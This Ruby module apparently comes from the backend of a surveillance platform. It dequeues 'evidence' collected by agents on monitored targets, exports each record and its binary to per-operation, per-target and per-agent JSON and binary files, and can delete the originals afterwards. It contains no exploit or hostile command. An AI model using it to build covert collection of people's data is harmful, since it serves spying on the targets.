require 'rcs-common/trace'
require 'fileutils'

module RCS
  module Connector
    module Dispatcher
      extend RCS::Tracer
      extend self

      # Pops out an item from the connectors queue and sends it
      # the the #process method. This method is called periodically
      # using an EM timer.
      def dispatch
        unless can_dispatch?
          trace :warn, "Cannot dispatch connectors queue due to license limitation."
          return
        end

        ary = ConnectorQueue.get_queued
        return if ary.blank?

        connector_queue, remaining_count = *ary
        process(connector_queue)
      end

      # Processes an item coming from the connectors queue. It dumps the
      # related evidence following the connector(s) rules and (eventually)
      # it destroy the evidence at the end.
      def process connector_queue
        trace :debug, "Processing ConnectorQueue item #{connector_queue.id}"

        target = ::Item.targets.find(connector_queue.tg_id)
        evidence = ::Evidence.collection_class(target).find(connector_queue.ev_id)
        connectors = ::Connector.any_in(id: connector_queue.cn_ids)

        connectors.each do |connector|
          dump(evidence, connector)
        end

        if RCS::DB::Connectors.discard_evidence?(connectors)
          trace :debug, "Deleting evidence #{evidence.id} due to matching connectors settings"
          evidence.destroy
        end
      end

      # Checks the license
      def can_dispatch?
        LicenseManager.instance.check :connectors
      end

      # Dump the given evidence to a file following the rules specified
      # in the connector.
      def dump(evidence, connector)
        trace :debug, "Dumping #{evidence.id} with connector #{connector.id}"

        # the generator of the evidence
        agent = ::Item.find(evidence.aid)
        operation = ::Item.find(agent.path.first)
        target = ::Item.find(agent.path.last)

        # prepare it for export
        exported = evidence.as_document.stringify_keys
        exported['data'] = evidence.data.stringify_keys

        # don't export uninteresting fields
        ['blo', 'note', 'kw'].each {|name| exported.delete(name) }

        # insert operation and target references
        exported['oid'] = operation.id.to_s
        exported['tid'] = target.id.to_s

        exported['operation'] = operation.name
        exported['target'] = target.name
        exported['agent'] = agent.name

        if evidence.data['_grid']
          exported['data'].delete('_grid')
          exported['data']['_bin_size'] = exported['data'].delete('_grid_size')
        end

        # TODO: support XML conversion
        # convert it to json
        exported = exported.to_json

        # the full exporting path will be splitted in subdir (one for each item)
        folders = [connector.dest]
        folders << "#{operation.name}-#{operation.id}"
        folders << "#{target.name}-#{target.id}"
        folders << "#{agent.name}-#{agent.id}"
        path = File.join(*folders)

        # ensure the dest folder is created
        FileUtils.mkdir_p(path)

        # dump the evidence
        File.open(File.join(path, "#{evidence.id}.json"), 'wb') { |d| d.write(exported) }

        # dump the binary (if any)
        if evidence.data['_grid']
          file = RCS::DB::GridFS.get(evidence.data['_grid'], target.id.to_s)
          File.open(File.join(path, "#{evidence.id}.bin"), 'wb') { |d| d.write(file.read) }
        end
      end
    end
  end
end
